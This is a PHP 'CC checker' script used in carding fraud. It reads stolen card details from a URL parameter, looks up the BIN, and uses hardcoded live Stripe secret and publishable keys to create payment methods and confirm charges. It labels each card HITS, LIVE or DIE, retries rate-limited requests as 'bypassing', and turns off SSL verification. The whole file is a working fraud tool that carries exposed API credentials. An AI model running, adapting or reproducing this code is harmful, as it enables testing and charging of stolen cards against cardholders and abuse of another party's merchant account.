<?php

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

function GetStr($string, $start, $end)
{
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

function multiexplode($seperator, $string)
{
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
}

$skArray = array(
    1 => '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',
);

if (isset($skArray)) {
    $sk = $skArray[array_rand($skArray)];
} else {
    echo '<b>❌ NO SK PROVIDED</b>';
}

$pkArray = array(
    1 => 'pk_live_51Ilh1wBWK6Bv9LQB36TY34yNVfyWXpVFH4FIx1rT0HoQSvhtQaulwKAmKcZIGLcoJYYt5ITaO7SIF3ZF0mpZhrfR00GnE4cO9l',
);

if (isset($pkArray)) {
    $pk = $pkArray[array_rand($pkArray)];
} else {
    echo '<b>❌ NO PK PROVIDED</b>';
}

$amt =  2;
if (isset($_GET['amount'])) {
    $amt = $_GET['amount'];
}
$amount = $amt * 100;
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
$bins = substr($cc, 0, 6);
$band = array("404313");
list($ban) = $band;
if ($bins == $ban) {
    echo "<b>🚫 BIN BANNED!</b><br>";
} else {
    #########################[BIN LOOK-UP]############################

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/' . $cc);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: lookup.binlist.net',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
    ));
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '');
    $fim = curl_exec($ch);
    $emoji = GetStr($fim, '"emoji":"', '"');
    curl_close($ch);

    #########################

    $ch = curl_init();
    $bin = substr($cc, 0, 6);
    curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $bindata = curl_exec($ch);
    $binna = json_decode($bindata, true);
    $brand = $binna['scheme'];
    $country = $binna['country']['name'];
    $type = $binna['type'];
    $bank = $binna['bank']['name'];
    curl_close($ch);

    $bindata1 = " $type - $brand - $country $emoji"; //CREDIT - MASTERCARD - UNITED STATES 🇺🇸
    #-------------------[1st REQ]--------------------#
    $x = 0;
    while (true) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $pk . ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]=' . $cc . '&card[exp_month]=' . $mes . '&card[exp_year]=' . $ano . '&card[cvc]=' . $cvv . '');
        $result1 = curl_exec($ch);
        $tok1 = Getstr($result1, '"id": "', '"');
        $msg = Getstr($result1, '"message": "', '"');
        $cnt = Getstr($result1, '"country": "','"');
        if (strpos($result1, "rate_limit")) {
            $x++;
            continue;
        }
        break;
    }
    #-------------------[2nd REQ]--------------------#
    $x = 0;
    while (true) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=' . $amount . '&currency=usd&payment_method_types[]=card&description=Hell Donation&payment_method=' . $tok1 . '&confirm=true&off_session=true');
        $result2 = curl_exec($ch);
        $tok2 = Getstr($result2, '"id": "', '"');
        $receipturl = trim(strip_tags(getStr($result2, '"receipt_url": "', '"')));
        $cvc_check = trim(strip_tags(getStr($result2, '"cvc_check": "', '"')));
        if (strpos($result2, "rate_limit")) {
            $x++;
            continue;
        }
        break;
    }

    //=================== [ RESPONSES ] ===================//
    if (strpos($result2, '"seller_message": "Payment complete."')) {

        echo '<b>✅ #HITS</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>💰 Response:</b> $' . $amt . ' Charged ✅<br>🧾 <b>Receipt :</b> <a href=' . $receipturl . '>Get Receipt</a><br>' . $brand . '┃' . $cnt . '┃' . $type . ' ' . $emoji . '<br><b>@CARD3DBOTx</b><br>';
    } elseif (strpos($result2, '"cvc_check": "pass"')) {
        echo '<b>✅ #LIVE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🔒 Result:</b> CVV LIVE</span><br>' . $brand . '┃' . $cnt . '┃' . $type . ' ' . $emoji . '<br><b>@CARD3DBOTx</b><br>';
    } elseif (strpos($result1, "generic_decline") || strpos($result2, "generic_decline")) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> GENERIC DECLINED</span><br>';
    } elseif (strpos($result2, "insufficient_funds")) {
        echo '<b>✅ #LIVE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>💵 Result:</b> INSUFFICIENT FUNDS</span><br>' . $brand . '┃' . $cnt . '┃' . $type . ' ' . $emoji . '<br><b>@CARD3DBOTx</b><br>';
    } elseif (strpos($result2, "fraudulent")) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> FRAUDULENT</span><br>';
    } elseif (strpos($result2, "do_not_honor") || strpos($result1, "do_not_honor")) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> DO NOT HONOR</span><br>';
    } elseif (strpos($result2, '"code": "incorrect_cvc"')) {
        echo '<b>✅ #LIVE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🔒 Result:</b> Security code is incorrect</span><br>' . $brand . '┃' . $cnt . '┃' . $type . ' ' . $emoji . '<br><b>@CARD3DBOTx</b><br>';
    } elseif (strpos($result1, "invalid_expiry_month")) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> INVALID EXPIRY MONTH</span><br>';
    } elseif (strpos($result2, "invalid_account")) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> INVALID ACCOUNT</span><br>';
    } elseif (strpos($result2, "lost_card")) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> LOST CARD</span><br>';
    } elseif (strpos($result2, "stolen_card")) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> STOLEN CARD</span><br>';
    } elseif (strpos($result2, "transaction_not_allowed")) {
        echo '<b>✅ #LIVE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> TRANSACTION NOT ALLOWED</span><br>' . $brand . '┃' . $cnt . '┃' . $type . ' ' . $emoji . '<br><b>@CARD3DBOTx</b><br>';
    } elseif (strpos($result2, "authentication_required") || strpos($result2, "card_error_authentication_required")) {
        echo '<b>✅ #LIVE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🔒 Result:</b> 3D Secure Required</span><br>';
    } elseif (strpos($result2, "pickup_card")) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> PICKUP CARD</span><br>';
    } elseif (strpos($result2, 'Your card has expired.')) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> EXPIRED CARD</span><br>';
    } elseif (strpos($result2, "card_decline_rate_limit_exceeded")) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> SK IS AT RATE LIMIT</span><br>';
    } elseif (strpos($result2, '"code": "processing_error"')) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> PROCESSING ERROR</span><br>';
    } elseif (strpos($result2, ' "message": "Your card number is incorrect."')) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> YOUR CARD NUMBER IS INCORRECT</span><br>';
    } elseif (strpos($result1, "incorrect_number")) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> INCORRECT CARD NUMBER</span><br>';
    } elseif (strpos($result1, "testmode_charges_only")) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> SK KEY IS IN TEST MODE OR INVALID</span><br>';
    } elseif (strpos($result1, "api_key_expired")) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> SK KEY REVOKED</span><br>';
    } elseif (strpos($result1, "parameter_invalid_empty")) {
        echo '<b>❌ #DIE</b></span>  </span>CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> ENTER CC TO CHECK</span><br>';
    } else {
        echo '<b>❌ #DIE</b></span> CC:  <b>' . $lista . '</b></span>  <br><b>🚫 Result:</b> ' . $result2 . ' <br>';
    }
    echo "<b>BYPASSING:</b> $x <br>";
    curl_close($ch);
    ob_flush();
}
?>
